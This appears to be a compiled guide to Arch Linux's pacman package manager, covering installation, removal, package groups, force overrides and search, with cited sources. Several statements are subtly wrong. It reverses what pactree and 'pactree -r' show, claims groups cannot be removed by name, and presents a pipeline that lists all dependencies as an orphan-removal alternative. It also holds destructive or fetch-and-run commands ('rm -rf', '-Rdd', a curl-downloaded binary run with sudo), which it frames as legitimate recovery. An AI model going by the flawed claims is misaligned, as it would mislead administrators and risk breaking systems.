This is particularly useful when running installation commands repeatedly or in scripts.[3]

#### --asexplicit Flag

Mark packages as explicitly installed rather than dependencies:[1]

```
pacman -S --asexplicit package_name
```

This affects how pacman tracks installation reasons, important for orphan detection.[1]

#### --asdeps Flag

Mark packages as dependencies rather than explicitly installed:[1]

```
pacman -S --asdeps package_name
```

Useful when manually installing dependencies that should be tracked as such.[1]

### Downloading Without Installing

Download packages without installing them using the `-w` flag:[4]

```
pacman -Sw package_name
```


This downloads packages and dependencies to the cache directory but does not install them. Useful for offline installation preparation or cache population.[4]

**Download to custom directory:**
```
pacman -Sw --cachedir /path/to/directory package_name
```


### Installing from Custom Repositories

Custom repositories can be added to `/etc/pacman.conf` and used like official repositories.[5][4]

**Add custom repository to `/etc/pacman.conf`:**
```
[custom-repo]
SigLevel = Optional TrustAll
Server = file:///path/to/repo
```


**Synchronize and install:**
```
pacman -Sy
pacman -S package_from_custom_repo
```


The custom repository becomes a first-class citizen, and packages can be installed using standard pacman commands.[5]

### Installing from Local Files

Install packages from local `.pkg.tar.zst` files using the `-U` option:[6]

```
pacman -U /path/to/package.pkg.tar.zst
```


Pacman automatically resolves and installs dependencies from configured sync repositories.[6]

**Installing from URLs:**
```
pacman -U https://example.com/package.pkg.tar.zst
```


This downloads and installs the package with dependency resolution.[6]

### Installing from Local Directories

When packages are stored locally without a repository database, they can be installed directly:[6]

```
pacman -U /path/to/packages/package_name.pkg.tar.zst
```


However, without a proper repository setup, automatic dependency resolution from the local directory does not work. Dependencies must either exist in configured repositories or be installed manually.[6]

**Setting up a local repository:**
Create a repository database for proper dependency resolution:[4][6]

```
repo-add /path/to/repo/custom.db.tar.zst /path/to/repo/*.pkg.tar.zst
```


Then add the repository to `/etc/pacman.conf` and install normally with `pacman -S`.[5][6]

### Pre-Installation Preparation

#### Synchronize Package Databases

Before installing packages, ensure repository databases are current:[7]

```
pacman -Sy
```

Or combine synchronization with installation:
```
pacman -Sy package_name
```

**Warning:** Running `pacman -Sy` alone without upgrading the system can lead to partial upgrades, which are not supported in Arch Linux. Always prefer `pacman -Syu` for system upgrades before installing new packages.[7][1]

#### Update System First

The recommended practice is to fully update the system before installing new packages:[7]

```
pacman -Syu
pacman -S package_name
```


This ensures all dependencies are current and prevents version conflicts.[7]

### Installation Transaction Flow

When installing packages, pacman follows this process:[1]

1. Synchronizes repository databases (if `-y` flag used)
2. Resolves all package dependencies
3. Checks for conflicts with installed packages
4. Downloads packages to cache directory
5. Verifies package signatures (if enabled)
6. Presents transaction summary for confirmation
7. Executes PreTransaction hooks
8. Installs packages and dependencies
9. Executes PostTransaction hooks
10. Updates package database
11. Logs transaction to `/var/log/pacman.log`

### Confirmation and Interactive Prompts

Pacman displays a transaction summary before proceeding:[1]

```
Packages (5) dependency1-1.0  dependency2-2.0  package_name-3.0
             extra-package-1.5  another-package-4.2

Total Download Size:    45.00 MiB
Total Installed Size:  180.00 MiB

:: Proceed with installation? [Y/n]
```

Press `Y` or Enter to proceed, `n` to abort.[1]

### Non-Interactive Installation

For automated scripts, skip confirmation prompts using `--noconfirm`:[1]

```
pacman -S --noconfirm package_name
```

**Warning:** This installs packages without user confirmation and should be used cautiously.[1]

### Installation Error Handling

If installation fails due to conflicts, file ownership issues, or dependency problems, pacman displays detailed error messages. Common issues include:[1]

- Conflicting files between packages
- Unresolvable dependencies
- Insufficient disk space
- Network connectivity problems
- Signature verification failures

Review error messages carefully to identify and resolve issues before retrying installation.[1]

### Installing Base Development Tools

Essential development tools can be installed as a group:[3]

```
pacman -S base-devel
```


This group contains compilers, build tools, and utilities required for building packages from source, including AUR packages.[3]

Sources
[1] pacman - ArchWiki https://wiki.archlinux.org/title/Pacman
[2] Arch Linux Pacman: A Detailed Guide with Commands and Examples https://dev.to/snigdhaos/arch-linux-pacman-a-detailed-guide-with-commands-and-examples-en5
[3] how do i install things from the user depository? - archlinux - Reddit https://www.reddit.com/r/archlinux/comments/19fk58v/how_do_i_install_things_from_the_user_depository/
[4] pacman/Tips and tricks - ArchWiki https://wiki.archlinux.org/title/Pacman/Tips_and_tricks
[5] Managing Arch Linux using a custom package repository https://www.joram.io/blog/custom-arch-linux-package-repository/
[6] How to install packages from local folder - Arch Linux Forums https://bbs.archlinux.org/viewtopic.php?id=119953
[7] Installing Pacman in Arch Linux — When You Blow it Up https://blog.stackademic.com/installing-pacman-in-arch-linux-when-you-blow-it-up-aa40778aa237
[8] Arch Linux package manager (pacman) cheatsheet - Ratfactor.com http://ratfactor.com/cards/arch-pacman-cheatsheet
[9] Arch Linux's Pacman: A ℂomfy Guide - YouTube https://www.youtube.com/watch?v=1dsFtZa9p4U

## Removing Packages and Dependencies

### Basic Removal Command

To remove a single package while leaving all of its dependencies installed, use the `-R` (remove) option:[4]

```
pacman -R package_name
```


This removes only the specified package without affecting any other packages on the system.[4]

### Removing Multiple Packages

Multiple packages can be removed simultaneously by listing them after the `-R` flag:[4]

```
pacman -R package1 package2 package3
```


This removes all specified packages in a single transaction.[4]

### Removing Packages with Dependencies

#### Remove Package and Unused Dependencies

To remove a package along with its dependencies that are not required by any other package, use the `-Rs` flag:[1][3][4]

```
pacman -Rs package_name
```


The `-s` flag tells pacman to recursively remove dependencies that are no longer needed by any other installed package. This is the most commonly used removal command for cleaning up packages properly.[3][1][4]

#### Remove Package and All Dependents

To remove a package and everything that depends on it (cascade removal), use the `-Rc` flag:[2][1]

```
pacman -Rc package_name
```


**Warning:** This is potentially dangerous as it removes packages that rely on the target package, which may break system functionality. Use with extreme caution.[1][2]

### Removing Configuration Files

By default, pacman preserves configuration files when removing packages. To remove packages along with their configuration files, add the `-n` flag:[1][4]

```
pacman -Rn package_name
```


Configuration files are typically stored in `/etc/` and other system directories.[4]

### Combined Removal Options

#### Standard Cleanup Removal

The most comprehensive removal command combines multiple flags:[7][3][1]

```
pacman -Rns package_name
```


This command:
- `-R` removes the package
- `-n` removes configuration files
- `-s` recursively removes unneeded dependencies

This is recommended as the standard method for package removal.[3][1]

#### Cascade Removal with Cleanup

For aggressive removal including all dependents:[7][3]

```
pacman -Rcns package_name
```


This adds:
- `-c` cascade removal of dependent packages

**Warning:** Review the list of packages to be removed carefully before confirming this operation.[3]

#### Alternative Extended Removal

Some users prefer the `-Runs` flag combination:[7]

```
pacman -Runs package_name
```


The `-u` flag removes unneeded packages and is functionally similar to `-s` for most use cases.[3][7]

### Force Removal Options

#### Skip Dependency Checks

To remove a package without checking dependencies (breaking dependent packages), use `-Rdd`:[2]

```
pacman -Rdd package_name
```


**Warning:** This is extremely dangerous and will likely break your system. This command should be avoided except in very specific recovery scenarios. It leaves dependent packages installed but non-functional.[2]

#### Remove Without Confirmation

For scripting or automated removal, skip confirmation prompts with `--noconfirm`:[5]

```
pacman -Rns --noconfirm package_name
```


**Warning:** Use cautiously as this removes packages without user verification.[5]

### Removing Orphaned Packages

Orphaned packages are dependencies that were automatically installed but are no longer required by any other package.[6][8][5]

#### List Orphaned Packages

To list all orphaned packages:[6][5]

```
pacman -Qdtq
```


The flags break down as:
- `-Q` query installed packages
- `-d` restrict to packages installed as dependencies
- `-t` restrict to packages not required by any package
- `-q` quiet output (package names only)

This produces a list of packages that can be safely removed.[6]

#### Remove All Orphaned Packages

To automatically remove all orphaned packages:[5][6][3]

```
pacman -Rns $(pacman -Qdtq)
```


This command queries for orphaned packages and pipes them to the removal command. If no orphaned packages exist, the command exits cleanly without errors.[3][5][6]

**Alternative syntax:**
```
pacman -Qqd | pacman -Rsu -
```


The `-` at the end tells pacman to read the package list from standard input.[6]

### Removal Transaction Flow

When removing packages, pacman follows this process:[4]

1. Checks dependencies of packages being removed
2. Identifies all packages that will be affected
3. Verifies no critical dependencies will be broken
4. Presents removal summary for confirmation
5. Executes PreTransaction hooks
6. Removes packages from the system
7. Executes PostTransaction hooks
8. Updates package database
9. Logs transaction to `/var/log/pacman.log`

### Confirmation and Interactive Prompts

Pacman displays a removal summary before proceeding:[8][4]

```
Packages (5) dependency1-1.0  dependency2-2.0  package_name-3.0

Total Removed Size:  180.00 MiB

:: Do you want to remove these packages? [Y/n]
```

Press `Y` or Enter to proceed, `n` to abort.[8]

### Understanding Install Reasons

Pacman tracks why each package was installed:[3]

**Explicitly installed:** Packages directly installed by the user[3]

**Installed as dependency:** Packages automatically installed to satisfy dependencies[3]

Check a package's install reason with:[3]

```
pacman -Qi package_name
```


This displays comprehensive package information including the install reason and dependency relationships.[3]

### Changing Install Reason

#### Mark as Explicit

Change a dependency to explicitly installed (preventing automatic removal):[4]

```
pacman -D --asexplicit package_name
```


#### Mark as Dependency

Change an explicitly installed package to a dependency (allowing automatic removal when not needed):[4]

```
pacman -D --asdeps package_name
```


### Recursive Dependency Removal Behavior

The `-Rs` flag only removes dependencies that are no longer needed by any other package. If dependencies of the original dependencies are still required by other packages, they remain installed.[3]

**Example scenario:**
- Package A requires dependency B
- Dependency B requires dependency C
- Another package D also requires dependency C

When removing package A with `pacman -Rs A`:
- Package A is removed
- Dependency B is removed (only needed by A)
- Dependency C remains (still needed by package D)

This behavior is intentional and prevents breaking other installed packages.[3]

### Application Data Removal

Pacman only removes files that it installed from packages. Application-generated data is not managed by pacman and must be removed manually.[9][7]

**Common locations for application **
- `~/.config/application_name/` - Application configuration
- `~/.local/share/application_name/` - Application data
- `~/.cache/application_name/` - Application cache
- `/var/lib/application_name/` - System-wide application data

For complete removal, manually delete these directories after removing the package.[9]

**Example for Docker:**
```
pacman -Rns docker
rm -rf /var/lib/docker
rm -rf ~/.docker
```


### Simulating Removal

To preview what would be removed without actually removing packages, use the `--print` flag:[6]

```
pacman -Rns --print package_name
```


This displays the removal targets without performing the operation.[6]

### Viewing Dependency Tree

Before removing a package, view its dependency tree using `pactree`:[2]

```
pactree package_name
```


This shows all packages that depend on the target package, helping assess the impact of removal.[2]

**Reverse dependency tree:**
```
pactree -r package_name
```


This shows what the package depends on.[2]

### Package Groups Removal

When removing packages that are part of groups, specify individual packages rather than the group name:[4]

```
pacman -Rns package1 package2 package3
```

Pacman does not support removing entire groups with a single group name in removal commands.[4]

### HoldPkg Protection

Packages listed in the `HoldPkg` directive in `/etc/pacman.conf` are protected from removal. Attempting to remove these packages prompts for additional confirmation to prevent accidental removal of critical system components.[10]

### Removal Error Handling

If removal fails due to dependency issues, pacman displays detailed error messages identifying which packages require the target package. Review these messages to determine whether to:[2]

- Use `-Rc` to cascade remove dependents (dangerous)
- Keep the package installed
- Remove dependent packages individually first

### Regular Maintenance

Periodically clean up orphaned packages as part of system maintenance:[6][3]

```
pacman -Rns $(pacman -Qdtq)
```


Running this command after removing major software suites ensures the system stays clean and minimal.[6]

Sources
[1] Remove package and all its dependents : r/archlinux https://www.reddit.com/r/archlinux/comments/14c7ggx/remove_package_and_all_its_dependents/
[2] SOLVED proper way to remove package and deal those ... https://bbs.archlinux.org/viewtopic.php?id=277084
[3] pacman doesn't recursively remove package dependencies https://www.reddit.com/r/archlinux/comments/syxa93/pacman_doesnt_recursively_remove_package/
[4] pacman - ArchWiki https://wiki.archlinux.org/title/Pacman
[5] How to use Pacman to automatically remove ... https://www.tencentcloud.com/techpedia/102254
[6] How to remove orphaned unused packages in Arch Linux https://www.cyberciti.biz/faq/delete-remove-orphaned-unused-packages-arch-linux-pacman-command/
[7] What pacman command do you use to completely remove ... https://discuss.cachyos.org/t/what-pacman-command-do-you-use-to-completely-remove-a-package/8553
[8] How to Install and Remove Packages in Arch Linux https://www.geeksforgeeks.org/linux-unix/how-to-install-and-remove-packages-in-arch-linux/
[9] How i remove a package without leaving any trace https://forum.endeavouros.com/t/how-i-remove-a-package-without-leaving-any-trace/26573
[10] pacman.conf(5) - Arch manual pages https://man.archlinux.org/man/pacman.conf.5.en

## Group Installations

### Package Group Concept

A package group is a collection of related packages that can be installed together under a single group name. Package groups are defined by maintainers and allow convenient installation of multiple related packages with a single command. The group affiliation is saved in the `groups` attribute in each individual package's PKGBUILD file.[1][2]

### Installing Package Groups

#### Basic Installation Command

To install a package group, use the standard `-S` flag with the group name:[3][4]

```
pacman -S group_name
```


**Example:**
```
pacman -S gnome
pacman -S base-devel
pacman -S xorg
```


### Interactive Package Selection

When installing a group, pacman presents a numbered list of all packages in the group and allows interactive selection:[5][1][3]

```
:: There are 44 members in group gnome:
:: Repository extra
   1) baobab  2) cheese  3) eog  4) epiphany  5) evince  6) gdm  7) gnome-backgrounds
   2) gnome-calculator  9) gnome-calendar  10) gnome-characters  11) gnome-clocks
   ...

Enter a selection (default=all):
```


#### Selection Options

**Install all packages:**
Press `Enter` without typing anything to install all packages in the group.[5][3]

**Select specific packages:**
Enter package numbers separated by spaces:[3]
```
Enter a selection (default=all): 1 3 5 7-12
```

This installs packages 1, 3, 5, and packages 7 through 12.[3]

**Exclude specific packages:**
Use the caret (^) symbol to exclude packages:[3]
```
Enter a selection (default=all): ^2 ^4
```

This installs all packages except numbers 2 and 4.[3]

**Combine selections:**
Mix individual selections, ranges, and exclusions:
```
Enter a selection (default=all): 1-5 8 10-15 ^3 ^11
```

### Non-Interactive Group Installation

#### Install All Packages

To install all packages in a group without interactive prompts:[5][3]

```
pacman -S --needed group_name
```


The `--needed` flag skips packages that are already installed, preventing reinstallation prompts.[5][3]

#### Install Specific Packages from Group

List specific package names instead of the group name:[5][3]

```
pacman -S package1 package2 package3
```


This installs only the specified packages from the group without prompting for the entire group.[5]

### Listing Package Groups

#### List All Available Groups

To see all available package groups in repositories:[6][3]

```
pacman -Sg
```


This displays a list of all groups with their member packages.[3]

#### List Packages in Specific Group

To see which packages belong to a specific group:[6][3]

```
pacman -Sg group_name
```


**Example:**
```
pacman -Sg gnome
pacman -Sg base-devel
```

This shows all packages that are members of the specified group.[3]

#### List Installed Groups

To see which groups have packages installed on your system:[7]

```
pacman -Qg
```


This lists all groups that have at least one member package installed.[7]

#### Check Installed Packages from Group

To see which packages from a specific group are installed:[7]

```
pacman -Qg group_name
```


This shows only the installed members of the specified group.[7]

### Common Package Groups

#### base-devel

Contains essential development tools for building packages:[4][5]

```
pacman -S base-devel
```

This group includes compilers, build tools, and utilities required for AUR package building and development work.[4]

**Members include:**
- gcc (compiler)
- make (build automation)
- autoconf, automake (configuration tools)
- pkg-config (library configuration)
- fakeroot (privilege simulation)
- binutils (binary utilities)

#### xorg

Contains X Window System packages:[5]

```
pacman -S xorg
```

This group provides the graphical display server and related utilities.[5]

#### gnome

Contains GNOME desktop environment packages:[3][5]

```
pacman -S gnome
```

This group includes all core GNOME applications and utilities.[3][5]

#### plasma

Contains KDE Plasma desktop environment packages:

```
pacman -S plasma
```

This group provides the KDE desktop and associated applications.

### Package Groups vs Meta Packages

#### Package Groups

Package groups are loose collections where:[2][8][1]

- Individual packages can be selected during installation[1]
- Group membership is not tracked after installation[2]
- Removing a group requires manually specifying each package[1]
- Updates happen automatically through normal system updates[1]

#### Meta Packages

Meta packages are actual packages that depend on other packages:[8][1]

- All dependencies are installed together automatically[8][1]
- Removing the meta package can remove all dependencies[1]
- Meta package itself appears in installed package lists[1]
- Provides stricter dependency management[8]

### Group Membership Tracking

Pacman does not track which packages were installed as part of a group after installation. Group affiliation is only relevant during the installation process. After installation, packages are treated independently regardless of their group membership.[2]

To track which packages were installed from a group, you must manually record this information or use external tools.[2][7]

### Installing Partially Installed Groups

When a group already has some packages installed, pacman only prompts for packages that are not yet installed:[5]

```
pacman -S group_name
```

Already installed packages are excluded from the selection list automatically.[5]

To reinstall all group packages including those already installed, explicitly list all packages or use the `--needed` flag to skip up-to-date packages:

```
pacman -S --needed group_name
```


### Removing Package Groups

Package groups cannot be removed by group name. Each package must be removed individually:[1][5]

```
pacman -Rns package1 package2 package3
```


To remove all packages from a group, first list the group members and then pass them to the remove command:[5]

```
pacman -Rns $(pacman -Qgq group_name)
```


The `-Qgq` flags list installed packages from the group in quiet mode (names only), which are then passed to the removal command.[5]

### Group Installation with Dependencies

When installing a package group, pacman automatically resolves and installs all dependencies for selected packages, even if those dependencies are not part of the group:[4][3]

```
pacman -S base-devel
```

This installs all selected packages from `base-devel` plus any required dependencies from other packages or groups.[4]

### Scripting Group Installations

For automated installations, bypass interactive prompts using `--noconfirm`:[4]

```
pacman -S --noconfirm --needed group_name
```


This installs all group packages without confirmation and skips already installed packages.[4]

To install only specific packages from a group in scripts:

```
PACKAGES="package1 package2 package3"
pacman -S --noconfirm --needed $PACKAGES
```

### Searching for Groups

Search for groups containing specific keywords:[6]

```
pacman -Sg | grep keyword
```

**Example:**
```
pacman -Sg | grep desktop
```

This finds all groups related to desktop environments.

### Group Information

To get detailed information about packages in a group, query each package individually:[3]

```
pacman -Si $(pacman -Sgq group_name)
```

The `-Sgq` flag lists group members quietly, and `-Si` displays information for each package.[3]

### Update Behavior

Packages installed from groups update normally with system upgrades:[1][4]

```
pacman -Syu
```


Group membership does not affect update behavior—all installed packages update regardless of how they were originally installed.[1]

### Install Reason Tracking

Packages selected from a group are marked as explicitly installed. Their dependencies are marked as dependency-installed. This affects orphan detection when packages are removed.[1][3]

### Group-Based System Installation

During Arch Linux installation, groups like `base` are commonly used:[9]

```
pacstrap /mnt base linux linux-firmware
```


This installs the base system group and essential packages for a minimal installation.[9]

### Custom Group-Like Installations

While pacman does not support creating custom groups, meta packages can be created to achieve similar functionality. A meta package depends on multiple other packages, allowing group-like installations with better tracking.[8]

Sources
[1] Meta package and package group - ArchWiki https://wiki.archlinux.org/title/Meta_package_and_package_group
[2] Package Groups, how to use it correctly? : r/archlinux - Reddit https://www.reddit.com/r/archlinux/comments/v65rd3/package_groups_how_to_use_it_correctly/
[3] pacman - ArchWiki https://wiki.archlinux.org/title/Pacman
[4] How to Use Pacman in Arch Linux | SmartTech101 https://smarttech101.com/how-to-use-pacman-in-arch-linux
[5] How To Install And Remove A Package Group In Arch Linux https://ostechnix.com/the-easy-way-to-install-and-remove-a-package-group-in-arch-linux/
[6] pacman/Tips and tricks - ArchWiki https://wiki.archlinux.org/title/Pacman/Tips_and_tricks
[7] How can I get a list of installed package groups? - Arch Linux Forums https://bbs.archlinux.org/viewtopic.php?id=251788
[8] Managing Arch Linux with Meta Packages | Disconnected Systems https://disconnected.systems/blog/archlinux-meta-packages/
[9] Installation guide - ArchWiki https://wiki.archlinux.org/title/Installation_guide

## Force Operations and Overrides

### File Conflict Overrides

#### --overwrite Flag

When pacman encounters file conflicts during installation, the `--overwrite` flag forces installation by overwriting conflicting files:[1][3][7]

```
pacman -S --overwrite path/to/file package_name
```


**Overwrite specific files:**
```
pacman -S --overwrite /usr/lib/python3.10/site-packages/file.py package_name
```


**Overwrite all files from package (dangerous):**
```
pacman -S --overwrite "*" package_name
```


The glob pattern can specify which files to overwrite:[3][7]

```
pacman -S --overwrite /usr/share/\* package_name
```


**Warning:** Using `--overwrite "*"` globally is dangerous and should only be used when absolutely necessary. It can overwrite important system files managed by other packages, potentially breaking your system.[7]

#### Use Cases for --overwrite

**Package recovery:** Reinstalling a package when its files have been modified or corrupted:[3]
```
pacman -S --overwrite /etc/pacman.conf pacman
```


**Migrating between packages:** When switching between packages that provide the same files (e.g., replacing one implementation with another).[1]

**Resolving package conflicts:** When packages unintentionally contain overlapping files and you want to force installation despite the conflict.[1][7]

### Dependency Override Options

#### --nodeps Flag

Skip all dependency checks during installation or removal:[2][5]

```
pacman -S --nodeps package_name
```

Or for removal:
```
pacman -R --nodeps package_name
```

**Warning:** This is extremely dangerous and will likely break your system. Installing packages without dependencies leaves them non-functional, and removing packages without checking what depends on them breaks other software.[2]

#### -d Flag (Skip Dependency Checks)

The `-d` flag can be used multiple times to skip different levels of dependency checks:[9]

**Skip dependency version checks:**
```
pacman -Sd package_name
```

**Skip all dependency and file checks:**
```
pacman -Sdd package_name
```


Similarly for removal:
```
pacman -Rd package_name   # Skip single level
pacman -Rdd package_name  # Skip all checks
```


**Warning:** Using `-dd` allows installation or removal without any safety checks and should only be used in recovery scenarios.[9]

### Conflict Override

#### --force Flag (Deprecated)

The `--force` flag has been removed from recent versions of pacman and replaced by the more granular `--overwrite` flag. Older documentation may reference `--force`, but it no longer exists in modern pacman.[7]

#### Handling Package Conflicts

When two packages conflict (defined in their PKGBUILD files), one must be removed before the other can be installed:[2]

```
pacman -R conflicting_package
pacman -S desired_package
```


To force removal of the conflicting package and install the new one in a single transaction:
```
pacman -S desired_package
```

Pacman will prompt to remove the conflicting package automatically if conflicts are detected.[2]

**Manual conflict resolution:**
If automatic resolution fails, manually remove with dependency skipping:
```
pacman -Rdd conflicting_package
pacman -S desired_package
```


### Database Override Options

#### -y Flag (Refresh Database)

Force download of package databases even if they appear up to date:[8]

```
pacman -Sy
```

**Double refresh (force re-download):**
```
pacman -Syy
```


The `-yy` flag forces pacman to re-download package databases even if they're marked as current. This is useful when mirrors are out of sync or database corruption is suspected.[8]

#### -u Flag (Allow Downgrades)

The `-u` flag can be used multiple times to control upgrade behavior:[8]

**Standard upgrade:**
```
pacman -Syu
```

**Allow downgrades:**
```
pacman -Syuu
```


The `-uu` flag enables downgrading packages when repository versions are older than installed versions. This is useful when switching from testing repositories back to stable.[8]

### Reinstallation Options

#### Reinstall Package

Pacman reinstalls packages even if they're already up-to-date when explicitly specified:[3]

```
pacman -S package_name
```

To skip reinstallation of already installed packages, use `--needed`:
```
pacman -S --needed package_name
```


#### Force Reinstall with File Replacement

Reinstall a package and overwrite all its files, useful for system recovery:[3]

```
pacman -S --overwrite "*" package_name
```


### Install Reason Override

#### --asexplicit Flag

Mark packages as explicitly installed rather than dependencies during installation:[3]

```
pacman -S --asexplicit package_name
```


This changes the install reason tracking, affecting orphan detection behavior.[3]

#### --asdeps Flag

Mark packages as dependencies rather than explicitly installed:[3]

```
pacman -S --asdeps package_name
```


Useful when manually installing dependencies that should be tracked as such.[3]

#### Changing Install Reason Post-Installation

Modify install reasons for already installed packages using the `-D` flag:[3]

```
pacman -D --asexplicit package_name
pacman -D --asdeps package_name
```


### Confirmation Override

#### --noconfirm Flag

Skip all confirmation prompts and assume yes for all questions:

```
pacman -S --noconfirm package_name
pacman -Syu --noconfirm
```

**Warning:** This bypasses important safety confirmations and should only be used in automated scripts where the operation is known to be safe.

### Root and Path Overrides

#### --root Flag

Specify an alternative installation root directory:[5]

```
pacman --root /mnt/target -S package_name
```


The default root is `/`. This changes where pacman installs packages.[5]

**Note:** This is not suitable for mounted guest systems; use `--sysroot` instead.[5]

#### --sysroot Flag

Perform operations on a mounted guest system:

```
pacman --sysroot /mnt/guest -S package_name
```

This correctly handles chroot-like environments.[5]

#### --dbpath Flag

Override the database directory location:[5]

```
pacman --dbpath /custom/db/path -S package_name
```


Default is `/var/lib/pacman/`. Use with caution as incorrect paths can corrupt the package database.[5]

#### --cachedir Flag

Specify an alternative cache directory:[5]

```
pacman --cachedir /custom/cache -S package_name
```


This downloads packages to the specified directory instead of the default `/var/cache/pacman/pkg/`.[5]

### Architecture Override

#### --arch Flag

Specify an alternate architecture:[5]

```
pacman --arch i686 -S package_name
```


This overrides the system architecture setting, useful for cross-architecture operations.[5]

### Version Requirement Override

Specify version requirements during installation:[5]

```
pacman -S "bash>=3.2"
```


Quotes are required to prevent shell interpretation of the `>` symbol as redirection.[5]

### Manual Package Extraction

In extreme recovery scenarios when pacman itself is broken, packages can be manually extracted and the database updated afterward:[3]

```
tar -xvf package.pkg.tar.zst -C /
pacman -S --overwrite "*" package_name
```


**Warning:** This is a last-resort recovery method and should only be used when pacman is completely non-functional.[3]

### HoldPkg Override

Packages listed in `HoldPkg` in `/etc/pacman.conf` require additional confirmation before removal. This protection can be bypassed by confirming the additional prompt or by removing the package from the `HoldPkg` list temporarily.[10]

### IgnorePkg Override

Packages listed in `IgnorePkg` are normally skipped during upgrades. To explicitly upgrade ignored packages:[11]

```
pacman -S package_name
```

Explicitly naming the package overrides the ignore directive.[11]

### Force Package URL Installation

Install packages directly from URLs, bypassing repository checks:[6]

```
pacman -U http://example.com/package-1.0-1-x86_64.pkg.tar.zst
```


This downloads and installs the package with dependency resolution from configured repositories.[6]

### Recovery Operations

#### Using pacman-static

When the regular pacman installation is broken, use the static version:[4][3]

```
curl -L -o pacman-static https://pkgbuild.com/~morganamilo/pacman-static/x86_64/bin/pacman-static
chmod +x pacman-static
sudo ./pacman-static -Syu pacman
```


This bypasses library dependency issues and can repair a broken pacman installation.[4][3]

### Best Practices for Force Operations

Force operations should be used sparingly and only when necessary:[7]

- Always understand why the conflict or error exists before forcing past it
- Prefer specific `--overwrite` patterns over global `--overwrite "*"`
- Avoid `--nodeps` and `-dd` flags except in recovery scenarios
- Document force operations for future troubleshooting reference
- Consider whether the underlying issue can be resolved properly instead of forced

Sources
[1] Force pacman to install a package despite having some ... https://www.reddit.com/r/archlinux/comments/c2eymy/force_pacman_to_install_a_package_despite_having/
[2] How to force install conflicting packages with pacman? ... https://bbs.archlinux.org/viewtopic.php?id=247171
[3] pacman - ArchWiki https://wiki.archlinux.org/title/Pacman
[4] How to repair broken packages using Pacman? https://www.tencentcloud.com/techpedia/102256
[5] pacman(8) https://pacman.archlinux.page/pacman.8.html
[6] How To Use Arch Linux Package Management https://www.digitalocean.com/community/tutorials/how-to-use-arch-linux-package-management
[7] Pacman overwrite files - Support https://forum.manjaro.org/t/pacman-overwrite-files/151377
[8] Pacman equivalent to pamac upgrade --force-refresh https://forum.manjaro.org/t/pacman-equivalent-to-pamac-upgrade-force-refresh/152786
[9] SOLVED proper way to remove package and deal those ... https://bbs.archlinux.org/viewtopic.php?id=277084
[10] pacman.conf(5) - Arch manual pages https://man.archlinux.org/man/pacman.conf.5.en
[11] pacman/Tips and tricks - ArchWiki https://wiki.archlinux.org/title/Pacman/Tips_and_tricks

# Querying and Information


## Searching for Packages

### Repository Package Search

#### Basic Search Command

To search for packages in sync databases (repositories), use the `-Ss` flag:[1][2][3]

```
pacman -Ss search_term
```


This searches both package names and descriptions in all configured repositories.[2][1]

**Examples:**
```
pacman -Ss firefox
pacman -Ss text editor
pacman -Ss media player
```


#### Multiple Search Terms

Search for multiple terms simultaneously:[5][1]

```
pacman -Ss string1 string2 string3
```


This searches for packages containing all specified terms in their name or description.[1]

**Example:**
```
pacman -Ss python web framework
```

#### Regular Expression Search

The `-Ss` flag uses Extended Regular Expressions (ERE) by default. This enables powerful pattern matching but can sometimes produce unwanted results.[1]

**Limit search to package names only:**
```
pacman -Ss '^vim-'
```


The `^` anchor matches the beginning of the package name, excluding description matches.[1]

**Match exact package name:**
```
pacman -Ss '^packagename$'
```

The `$` anchor matches the end of the package name, ensuring exact matches only.[1]

**Search with regex patterns:**
```
pacman -Ss 'python.*tensorflow'
pacman -Ss '^lib.*-dev$'
```


### Searching Installed Packages

#### Basic Local Search

To search for packages already installed on the system, use the `-Qs` flag:[2][5][1]

```
pacman -Qs search_term
```


This queries the local package database and searches installed packages by name and description.[2][1]

**Examples:**
```
pacman -Qs firefox
pacman -Qs python
pacman -Qs kernel
```


#### Multiple Terms for Local Search

Search installed packages with multiple terms:[1]

```
pacman -Qs string1 string2
```


### File Search in Packages

#### Searching for Files in Remote Packages

To search for files in remote repository packages, use the `-F` flag:[3][1]

```
pacman -F filename
```


This searches the files database to find which packages contain the specified file.[1]

**Examples:**
```
pacman -F vim
pacman -F /usr/bin/gcc
pacman -F libcrypto.so
```


#### Update Files Database

Before searching files, synchronize the files database for up-to-date results:[3][1]

```
pacman -Fy
```


This downloads the latest files database from configured repositories.[1]

**Automated updates:**
Enable and start the `pacman-filesdb-refresh.timer` to refresh the files database weekly:[1]

```
systemctl enable --now pacman-filesdb-refresh.timer
```


#### Multiple File Search

Search for multiple files simultaneously:[1]

```
pacman -F string1 string2 string3
```


### Package Information Display

#### Repository Package Information

Display detailed information about a package in repositories using `-Si`:[1]

```
pacman -Si package_name
```


This shows:
- Package name and version
- Repository location
- Description
- Architecture
- URL
- Licenses
- Dependencies
- Optional dependencies
- Conflicts
- Provides
- Package size
- Installation size
- Packager information
- Build date

**Example:**
```
pacman -Si firefox
```


#### Installed Package Information

Display detailed information about an installed package using `-Qi`:[1]

```
pacman -Qi package_name
```


This includes the same information as `-Si` plus:
- Install date
- Install reason (explicitly installed or dependency)
- Validation method

**Extended information:**
Pass two `-i` flags to also display backup files and their modification states:[1]

```
pacman -Qii package_name
```


### File Listing

#### List Files from Installed Package

Display all files installed by a local package using `-Ql`:[6][1]

```
pacman -Ql package_name
```


This shows the complete list of files, directories, and symlinks installed by the package.[1]

**Example:**
```
pacman -Ql firefox
```


#### List Files from Remote Package

Display files that would be installed by a remote package using `-Fl`:[1]

```
pacman -Fl package_name
```


This requires an up-to-date files database (`pacman -Fy`).[1]

### File Ownership Query

#### Find Package Owning a File

Determine which package owns a specific file on the system using `-Qo`:[6][1]

```
pacman -Qo /path/to/file
```


**Examples:**
```
pacman -Qo /usr/bin/firefox
pacman -Qo /etc/pacman.conf
pacman -Qo $(which vim)
```


#### Find Remote Package Containing File

Query which remote package contains a specific file using `-F` with a path:[1]

```
pacman -F /path/to/file
```


This searches the files database for packages containing the specified path.[1]

### Listing Packages

#### List All Installed Packages

Display all installed packages:

```
pacman -Q
```

This shows package names with versions.

#### List Explicitly Installed Packages

Show packages explicitly installed by the user (not dependencies):[1]

```
pacman -Qe
```


More verbose output:
```
pacman -Qet
```


The `-t` flag restricts to packages not required as dependencies by other packages.[1]

#### List Orphaned Packages

Show packages installed as dependencies but no longer required:[1]

```
pacman -Qdt
```


The `-d` flag restricts to dependency packages, and `-t` restricts to packages not required by others.[1]

#### List Foreign Packages

Show packages not found in configured repositories (typically AUR packages):

```
pacman -Qm
```

#### List Repository Packages

Show packages found in configured sync databases:

```
pacman -Qn
```

### Search Output Format

#### Quiet Output

Display search results in quiet mode (package names only) using the `-q` flag:

```
pacman -Ssq search_term
pacman -Qsq search_term
```


